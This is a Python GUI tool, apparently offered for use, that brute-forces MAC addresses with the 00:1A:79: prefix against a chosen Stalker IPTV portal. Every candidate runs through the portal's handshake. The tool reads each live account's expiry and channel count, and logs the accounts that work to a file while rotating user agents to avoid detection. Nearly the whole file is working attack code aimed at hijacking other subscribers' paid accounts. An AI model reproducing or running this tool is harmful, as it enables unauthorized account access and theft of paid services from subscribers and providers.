import requests
import json
import sys
from datetime import datetime
from urllib.parse import urlparse
import random
import cryptography.hazmat.bindings.openssl
from PyQt5 import QtWidgets, QtGui, QtCore
import threading
cryptography.hazmat.bindings.openssl.CRYPTOGRAPHY_OPENSSL_300_OR_GREATER = True
from PyQt5.QtCore import QMetaType as qRegisterMetaType 

with open('agents.txt', 'r') as f:
    user_agents = [line.strip() for line in f]

def get_random_user_agent():
    return random.choice(user_agents)

def generate_mac_combinations(prefix: str = "00:1A:79:", start_from: str = None):
    start = 0
    middle = 0
    end = 0
    if start_from:
        start_parts = start_from.split(":")
        if len(start_parts) == 3:
            start, middle, end = [int(part, 16) for part in start_parts]
        else:
            print("Invalid start_from format. Expected three hexadecimal parts.")
            sys.exit(1)

    max_hex_value = 256  # Up to FF in hexadecimal
    for i in range(start, max_hex_value):
        for j in range(middle if i == start else 0, max_hex_value):
            for k in range(end if j == middle else 0, max_hex_value):
                yield f"{prefix}{i:02X}:{j:02X}:{k:02X}"

class StalkerPortalApp(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.stop_event = threading.Event()
        self.thread = None

    def initUI(self):
        self.setWindowTitle("Stalker Portal MAC Generator&Checker")
        self.resize(800, 600)  # Set the window size to 800x600

        layout = QtWidgets.QVBoxLayout()

        form_layout = QtWidgets.QFormLayout()
        self.url_entry = QtWidgets.QLineEdit()
        self.mac_entry = QtWidgets.QLineEdit()
        form_layout.addRow("Enter Stalker Portal with Port:", self.url_entry)
        form_layout.addRow("Enter a full MAC address to start from:", self.mac_entry)

        layout.addLayout(form_layout)

        self.start_button = QtWidgets.QPushButton("Start")
        self.start_button.clicked.connect(self.start_thread)
        self.stop_button = QtWidgets.QPushButton("Stop")
        self.stop_button.clicked.connect(self.stop_process)

        button_layout = QtWidgets.QHBoxLayout()
        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)

        layout.addLayout(button_layout)

        self.output_text = QtWidgets.QTextEdit()
        self.output_text.setReadOnly(True)
        layout.addWidget(self.output_text)

        self.setLayout(layout)

        # Print the selected user agent when the application starts
        self.print_user_agent()

    def print_colored(self, text: str, color: str) -> None:
        self.output_text.setTextColor(QtGui.QColor(color))
        self.output_text.append(text)
        self.output_text.moveCursor(QtGui.QTextCursor.End)

    def print_user_agent(self):
        user_agent = get_random_user_agent()
        self.print_colored(f"Selected user agent: {user_agent}", "blue")

    def start_process(self):
        base_url = self.url_entry.text().strip()
        user_mac_input = self.mac_entry.text().strip().upper()
        base_mac = "00:1A:79:"
        start_from = None

        if not base_url:
            QtWidgets.QMessageBox.critical(self, "Error", "Please enter the Stalker Portal URL with Port.")
            return

        parsed_url = urlparse(base_url)
        host = parsed_url.hostname
        port = parsed_url.port

        if port is None:
            port = 80

        base_url = f"http://{host}:{port}"

        current = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

        if user_mac_input:
            if user_mac_input.startswith(base_mac):
                start_from = user_mac_input.replace(base_mac, "")
            else:
                self.print_colored("Invalid MAC address format. Please ensure it starts with '00:1A:79:'.", "red")
                return

        for mac in generate_mac_combinations(prefix=base_mac, start_from=start_from):
            if self.stop_event.is_set():
                break
            try:
                s = requests.Session()
                s.cookies.update({'mac': f'{mac}'})
                url = f"{base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"

                res = s.get(url, timeout=10, allow_redirects=False)
                if res.text:
                    data = json.loads(res.text)
                    tok = data['js']['token']

                    url2 = f"{base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                    headers = {"Authorization": f"Bearer {tok}"}
                    res2 = s.get(url2, headers=headers, timeout=10, allow_redirects=False)

                    if res2.text:
                        data = json.loads(res2.text)
                        if 'js' in data and 'mac' in data['js'] and 'phone' in data['js']:
                            mac = data['js']['mac']
                            expiry = data['js']['phone']
                            url_genre = f"{base_url}/server/load.php?type=itv&action=get_genres&JsHttpRequest=1-xml"
                            res_genre = s.get(url_genre, headers=headers, timeout=10, allow_redirects=False)

                            group_info = {}

                            if res_genre.status_code == 200:
                                id_genre = json.loads(res_genre.text)['js']
                                for group in id_genre:
                                    group_info[group['id']] = group['title']

                            url3 = f"{base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
                            res3 = s.get(url3, headers=headers, timeout=10, allow_redirects=False)
                            count = 0
                            if res3.status_code == 200:
                                channels_data = json.loads(res3.text)["js"]["data"]
                                for channel in channels_data:
                                    count += 1
                            else:
                                self.print_colored("Failed to fetch channel list", "red")
                            if count == 0:
                                self.print_colored(f"There are no channels for mac: {mac}", "red")
                            else:
                                self.print_colored(f"MAC = {mac}\nExpiry = {expiry}\nChannels = {count}", "green")
                                with open(f"{host}_{current}.txt", "a") as f:
                                    f.write(f"{base_url}/c/\nMAC = {mac}\nExpiry = {expiry}\nChannels = {count}\n\n")
                else:
                    self.print_colored(f"No JSON response for MAC {mac}", "red")
            except json.decoder.JSONDecodeError:
                self.print_colored(f"JSON decode error for MAC {mac}: No valid JSON response.", "red")
            except Exception as e:
                self.print_colored(f"Error for MAC {mac}: {e}", "red")

    def start_thread(self):
        self.stop_event.clear()
        self.thread = threading.Thread(target=self.start_process)
        self.thread.start()

    def stop_process(self):
        self.stop_event.set()
        if self.thread is not None:
            self.thread.join()
        self.close()  # Close the application window

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    window = StalkerPortalApp()
    window.show()
    sys.exit(app.exec_())
